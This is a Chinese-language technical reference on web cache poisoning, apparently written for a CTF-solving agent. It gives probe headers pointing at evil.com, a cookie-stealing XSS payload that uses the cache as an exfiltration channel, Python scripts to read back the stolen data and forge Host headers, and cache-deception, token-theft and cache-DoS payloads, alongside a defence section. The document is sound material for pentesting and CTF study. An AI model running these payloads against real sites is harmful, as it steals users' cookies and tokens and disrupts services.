# Web Cache Poisoning 专题

> Web Cache Poisoning 深度参考。

---

## 1. 缓存投毒原理

### 1.1 什么是 Web 缓存？

反向代理（nginx/Cloudflare/Akamai）在用户和源服务器之间缓存响应：

```
用户请求 → 反向代理 → 检查缓存 → 命中(HIT): 返回缓存副本
                                    → 未命中(MISS): 转发到源服务器 → 缓存响应 → 返回给用户
```

### 1.2 缓存投毒的核心问题

**缓存把"只能影响自己的攻击"变成了"能影响其他用户的攻击"。**

```
无缓存:
  攻击者发恶意请求 → 只有攻击者收到恶意响应 → Self-XSS（无意义）

有缓存:
  攻击者发恶意请求 → 缓存存储恶意响应
  其他用户请求同一 URL → 命中缓存 → 收到恶意响应 → 被 XSS！
```

### 1.3 缓存投毒的必要条件

1. **存在缓存机制**：反向代理/CDN 配置了缓存
2. **攻击者能控制响应内容**：通过请求头/参数注入
3. **控制的内容在缓存键之外**（unkeyed）或缓存键可控
4. **缓存响应能命中其他用户**：缓存键匹配
5. **响应被浏览器解析为 HTML**：Content-Type 正确

---

## 2. 缓存键分析

### 2.1 缓存键的组成

缓存键决定了"两个请求是否命中同一缓存条目"：

```
缓存键 = HTTP Method + URL路径 + 查询参数 + Host + Vary头指定的请求头
```

**典型 nginx 缓存键**：
```
proxy_cache_key $scheme$host$request_uri;
# = http + proxy:4000 + /_next/page
```

### 2.2 主键 vs 二级键

| 键类型 | 来源 | 匹配规则 |
|--------|------|---------|
| 主键 | `proxy_cache_key` 指令 | 精确匹配（Method + Host + URL） |
| 二级键 | `Vary` 响应头 | 指定的请求头值必须匹配 |

**Vary 头示例**：
```
Vary: rsc, next-router-state-tree, next-router-prefetch, Accept-Encoding
```
意味着缓存会为 `rsc` + `next-router-state-tree` + `next-router-prefetch` + `Accept-Encoding` 的每个不同组合存储不同的缓存条目。

### 2.3 缓存键分析清单

分析缓存投毒时，逐一回答：

- [ ] 哪些路径被缓存？（看 proxy 配置）
- [ ] 缓存主键包含什么？（Host? Scheme? Query String?）
- [ ] 响应的 Vary 头包含什么？
- [ ] 攻击者能控制哪些请求头？
- [ ] 控制的头在缓存键中吗？
- [ ] 目标用户（Bot/其他用户）的请求头值是什么？
- [ ] 攻击者的缓存键和目标用户的缓存键能匹配吗？

### 2.4 unkeyed header 探针清单

**什么时候用**：确认目标路径被缓存后，寻找"影响响应内容但不进缓存键"的请求头（unkeyed input）——投毒的原料。

**缓存存在性识别**（同一请求发两次，对比响应头）：

| 响应头 | 含义 |
|--------|------|
| `X-Cache: HIT/MISS` | 通用缓存命中状态 |
| `Age: <秒>` | 缓存已存活时间（>0 说明命中） |
| `CF-Cache-Status: HIT` | Cloudflare 缓存 |
| `Via: 1.1 varnish` | 反代/缓存软件指纹 |

**探针清单**（逐头发送，观察响应是否被头值改变）：

| 请求头 | 测试值 | 预期反应（若头被后端消费） |
|--------|--------|---------------------------|
| `X-Forwarded-Host` | `evil.com` | 响应正文/链接/重定向中反射 evil.com |
| `X-Forwarded-Scheme` | `http` | 强制 HTTP 重定向 |
| `X-Original-URL` | `/admin` | 路径覆盖（访问控制绕过） |
| `X-Rewrite-URL` | `/admin` | 路径覆盖 |
| `X-Forwarded-For` | `127.0.0.1` | 绕过 IP 限制 |

**判定标准**：头值改变了响应内容 + 该头不在缓存键内（其他用户同 URL 请求命中同一缓存）→ 确认 unkeyed input，可构造投毒。成功标志：带恶意头的请求 MISS 后，无恶意头的普通请求返回 HIT 且携带恶意内容。

---

## 3. Vary 头绕过

### 3.1 Vary 头的作用

Vary 头告诉缓存："这个响应会根据哪些请求头的值而变化"。

```
Vary: Accept-Encoding
→ 缓存为每种 AE 值存不同副本
→ Accept-Encoding: gzip 和 Accept-Encoding: gzip, deflate 是不同的缓存条目
```

### 3.2 常见绕过方式

| 方式 | 原理 | 条件 |
|------|------|------|
| **空值 vs 缺失** | 框架检查 `!== undefined` vs `=== '1'`，空值通过宽松检查但 Vary 匹配时等同于缺失 | 两个模块对同一头有不同判断 |
| **值标准化差异** | 代理和源服务器对同一头的值解析/标准化方式不同 | 如 AE 排序、空格处理 |
| **未列在 Vary 中的头** | 响应内容受某头影响，但 Vary 未列出该头 | 应用漏洞/配置遗漏 |

### 3.3 空值绕过的经典 case（某 Next.js 实战）

**问题**：Next.js 框架内部两个文件对 `RSC` 请求头的判断不一致：

```javascript
// base-server.js（请求调度器）— 严格检查
isRSCRequest = req.headers['rsc'] === '1'  // 空字符串 → false

// app-render.js（渲染引擎）— 宽松检查
isRSCRequest = headers['rsc'] !== undefined  // 空字符串 → true
```

**结果**：发送 `RSC: ""`（空字符串）时：
- base-server.js 认为不是 RSC 请求（`"" !== "1"`）
- app-render.js 按 RSC 模式渲染（`"" !== undefined`）
- Vary 头的 `rsc` 字段值为空字符串
- Bot 不发 RSC 头 → Vary 的 `rsc` 字段也为空字符串
- **缓存键匹配**！

---

## 4. 组合利用

### 4.1 缓存投毒 + XSS

最常见的组合利用模式：

```
1. 找到反射点（用户输入出现在响应中）
2. 找到绕过转义的方式（框架渲染差异 / 编码绕过）
3. 确保响应 Content-Type 为 text/html
4. 找到缓存机制（反向代理缓存）
5. 构造缓存键匹配（Host/Vary 头值对齐）
6. 发送投毒请求 → 缓存存储 XSS 响应
7. 其他用户访问 → 命中缓存 → 执行 XSS
```

### 4.2 缓存中缓存（数据渗出）

当目标环境无外网时，XSS 无法外传数据，可利用缓存本身作为数据传递通道。详见本文 §6「缓存中缓存数据渗出」。

---

## 5. 防御措施

### 5.1 缓存配置

| 防御 | 说明 |
|------|------|
| 只缓存静态资源 | 避免缓存动态内容（HTML/API 响应） |
| 缓存键包含所有影响响应的头 | Vary 头必须完整列出所有相关头 |
| 禁用带请求头的缓存 | 不缓存非标准请求头的响应 |

### 5.2 应用层防御

| 防御 | 说明 |
|------|------|
| 输入验证/转义 | 所有用户输入在输出前转义 |
| Content-Type 严格 | 动态响应的 CT 固定，不依赖请求头 |
| CSP 头 | 即使被注入 HTML，CSP 也限制脚本执行 |
| Cookie HttpOnly + Secure | 减轻 XSS 的影响 |

### 5.3 框架层面

| 防御 | 说明 |
|------|------|
| 统一请求头检查逻辑 | 消除同一框架内不同模块的判断差异 |
| Vary 头自动管理 | 框架自动设置正确的 Vary 头 |
| 缓存控制头 | `Cache-Control: private` / `no-store` 防止缓存 |

---

## 6. 缓存中缓存数据渗出

> 当目标环境无外网（Docker 隔离）时，XSS 无法将数据发送到外部服务器。解法是利用缓存本身作为数据传递通道。

### 6.1 原理

XSS 代码不把数据发到外部，而是发到目标网站的另一个可缓存路径，让数据被缓存。攻击者再从外部读取该缓存。

```
第一阶段：攻击者投毒缓存（注入 XSS 到 /_next/attack-path）
第二阶段：XSS 在受害者浏览器中执行，将 Cookie/数据通过请求头发送到 /_next/exfil-path
          → 数据出现在 /_next/exfil-path 的响应中 → 被缓存
第三阶段：攻击者请求 /_next/exfil-path → 命中缓存 → 读取数据
```

### 6.2 XSS payload 模式

```javascript
// XSS 代码：读取 Cookie，写入另一个缓存路径
var c = document.cookie;
fetch('/_next/exfil', {
  headers: {
    'Content-Type': 'text/html',   // 触发 CT 覆盖（如果 middleware 支持）
    'RSC': '',                      // 触发 RSC 渲染（如果需要）
    'x-nonce': 'STOLEN:' + c       // 数据作为请求头值，反射到响应中
  }
}).catch(function(){});
```

### 6.3 适用条件

| 条件 | 说明 |
|------|------|
| 目标无外网 | Docker 隔离或网络管控 |
| 有可缓存的路径 | nginx 配置了 `proxy_cache` 的路径 |
| 反射点存在 | 请求数据会出现在响应中（如 nonce 反射） |
| 缓存键可控 | 攻击者能构造与 Bot 相同的缓存键 |

### 6.4 攻击者读取数据

```python
# 第三阶段：读取渗出数据
r = request('GET', '/_next/exfil', {
    'Host': 'proxy:4000',              # 匹配内部缓存键
    'Accept-Encoding': 'gzip, deflate' # 匹配 Bot 的 AE
})
if 'STOLEN:' in r['body']:
    flag = r['body'][r['body'].find('STOLEN:'):]
    print(f'FLAG: {flag}')
```

### 6.5 现实意义

| 场景 | 适用性 |
|------|-------|
| 受害者网络有管控（只能访问内网） | 适用 |
| 攻击者域名被封锁 | 适用 |
| 不想留下外部服务器痕迹 | 适用 |
| 受害者有外网访问 | 不需要（直接 webhook 外泄更简单） |

---

## 7. Bot 浏览器请求头探测

### 7.1 AE（Accept-Encoding）探测

**问题**：投毒时带的 AE 必须和 Bot 浏览器的 AE 精确匹配（Vary: Accept-Encoding）。

**探测方法**：利用缓存命中状态反推。

```
步骤 1：选一个没被访问过的新路径（确保缓存为空）
步骤 2：让 Bot 访问该路径（创建以 Bot AE 为二级键的缓存）
步骤 3：攻击者用不同 AE 值读取该路径
        → X-Proxy-Cache: HIT 的那个 AE 就是 Bot 的 AE
```

**脚本**（详见 `$AGENT_DIR/scripts/cache_poison.py` 的 `probe_accept_encoding` 函数）：

```python
ae_candidates = [
    'gzip, deflate, br',
    'gzip, deflate',
    'gzip',
    'gzip, br',
    'deflate',
    'identity',
]

for ae in ae_candidates:
    r = request('GET', probe_path, {'Accept-Encoding': ae})
    if r['cache'] == 'HIT':
        print(f'Bot AE: {ae}')
        break
```

**注意**：Docker 中使用系统包版 Chromium（非 Google Chrome）通常不支持 Brotli，AE 不含 `br`。

### 7.2 Host 头对齐

**问题**：攻击者从外网访问（Host: 外网IP），Bot 从内网访问（Host: 内部服务名），缓存主键不同。

**解决**：投毒时手动设置 `Host` 为 Bot 使用的内部域名。

```python
conn.request('GET', '/_next/attack', headers={
    'Host': 'proxy:4000',          # 伪造为内部域名
    'Accept-Encoding': bot_ae,     # 匹配 Bot 的 AE
    # ... 其他头
})
```

**注意**：浏览器的 Fetch API 禁止修改 `Host` 头，必须用 Python/curl 等工具。

---

## 8. 缓存欺骗（Cache Deception）

> 与缓存投毒目标相反：投毒是让所有用户收到恶意内容；欺骗是窃取特定用户的敏感数据。两者可与请求走私组合成跨用户攻击。

### 8.1 路径后缀手法

利用路径后缀让缓存层误认为是静态资源（缓存层看扩展名决定缓存，Web 服务器忽略多余路径段返回动态内容）：

```
/profile.php/nonexistent.js
/profile.php/.css
/profile.php/../test.js
/profile.php/%2e%2e/test.js
/profile.php/x.avif
```

验证：对敏感 API/页面追加 `.css`/`.js`/`.json` 后缀请求，检查 `X-Cache: Hit` 且缓存键不含认证头（无认证请求可命中同一缓存）。

**变体——用户名带 .js 后缀**: 注册用户名 `hfs-12345678.js` → `/profile/<user>.js` 本身即静态扩展名 URL，CDN 按扩展名当静态资产缓存（不 Vary Cookie）+ 个人页 self-XSS → 自己登录态访问一次污染边缘缓存 → 后续访问者（含 admin bot）拿到攻击者的已认证 HTML，self-XSS 变蠕虫式存储 XSS。

### 8.2 CSPT 辅助的缓存欺骗（账户接管链）

前置：SPA 存在客户端路径遍历（CSPT，前端 JS 把用户输入拼接进后续请求路径）+ CDN 按扩展名缓存。

```
受害者访问 → /user?userId=../../../v1/token.css
SPA 发起认证请求 → GET /v1/users/info/../../../v1/token.css
浏览器规范化 → GET /v1/token.css（自动携带 X-Auth-Token）
CDN 按 .css 缓存 → 响应体是受害者的 token JSON
攻击者访问 /v1/token.css → 从缓存读到 token
```

CSPT 漏洞点常见于 SPA 中把 URL 参数/查询参数拼接到 fetch 路径的位置。

---

## 9. URL 差异投毒（URL Discrepancy）

缓存服务器和 Web 服务器对 URL 的解析不一致 → 让缓存存储非预期内容。

### 9.1 分隔符差异

| 分隔符 | 框架行为 | 示例 |
|--------|---------|------|
| `;` | Spring 视为 matrix 参数 | `/hello;var=a/world` → `/hello/world` |
| `.` | Rails 视为格式后缀剥离 | `/MyAccount.css` → `/MyAccount` |
| `%00` | OpenLiteSpeed 截断路径 | `/MyAccount%00aaa` → `/MyAccount` |
| `%0a` | Nginx 分割 URL | `/users/MyAccount%0aaaa` → `/account/MyAccount` |

探测：动态页面路径后追加分隔符候选 + 随机字符串，响应与原始页面一致 → 有效分隔符。行为依框架版本/配置而异，用前实测。

### 9.2 编码差异

```
GET /myAccount%3Fparam HTTP/1.1
```

- Web 服务器解码 `%3F` 为 `?` → 返回 `/myAccount` 的内容
- 缓存服务器保留 `/myAccount%3Fparam` 作为缓存键

### 9.3 点段（Dot Segment）规范化差异

```
GET /static/../home/index HTTP/1.1
```

缓存以原始路径为键；源站规范化为 `/home/index` 返回内容 → 动态内容被缓存在 `/static/` 路径键下。

### 9.4 静态资源缓存规则利用

| 缓存触发条件 | 利用路径 |
|---|---|
| 按扩展名（.js/.css/.png/.jpg） | `/home$image.png` → 缓存键含 image.png，源站响应 /home |
| 按目录（/static/ /assets/ /wp-content/ /media/ /public/） | `/home/..%2fstatic/something` → 缓存规则命中，源站响应 /home |
| 按文件名（/robots.txt /favicon.ico /index.html） | `/home/..%2Frobots.txt` → 缓存 /robots.txt，响应 /home |

核心模式：让"缓存规则判定的路径"与"源站实际处理的路径"解耦。

---

## 10. 缓存投毒 DoS 技术

无法注入 XSS 时，投毒缓存为错误响应实现 DoS：

| 技术 | 原理 |
|------|------|
| Header Oversize (HHO) | 请求头超出源站头大小限制但不超缓存限制 → 400 被缓存 |
| Meta Character (HMC) | unkeyed 头注入 `\n` `\r` 控制字符触发源站 400 |
| Method Override (HMO) | `X-HTTP-Method-Override: POST` 改变方法触发错误 |
| Unkeyed Port | `Host: target.com:1` 端口不入缓存键但影响源站行为 |
| Fat GET | GET 带 body 触发源站 403（走私用法见 request-smuggling.md §3） |
| Host 大小写 | `Host: Cdn.TARGET.com` 大小写敏感源站返回 404 被缓存 |
| 路径编码 | `GET /api/v1%2e1/user` 源站 404，缓存层不解码以编码形式缓存 |

共同模式：找到"影响源站响应但不影响缓存键命中"的输入 → 错误响应占住正常 URL 的缓存条目。
